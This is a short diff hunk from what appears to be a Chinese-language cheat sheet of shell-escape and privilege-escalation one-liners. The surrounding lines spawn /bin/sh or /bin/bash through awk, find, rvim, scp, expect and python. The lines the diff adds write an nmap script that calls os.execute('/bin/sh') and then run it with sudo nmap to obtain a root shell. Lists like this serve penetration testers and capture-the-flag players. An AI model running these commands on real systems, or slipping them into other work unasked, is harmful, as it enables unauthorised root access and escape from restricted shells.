@@ -71,6 +71,8 @@ awk 'BEGIN {system("/bin/sh或/bin/bash")}'
 find / -name test -exec /bin/sh或/bin/bash \;
 rvim中执行:python import os; os.system("/bin/bash")
 scp -S /path/yourscript x y:
++ echo 'os.execute("/bin/sh")' > getroot.nse
++ sudo nmap --script getroot.nse
 -------------------------------------------------------
 except spawn sh
 python -c 'import os; os.system("/bin/sh")'
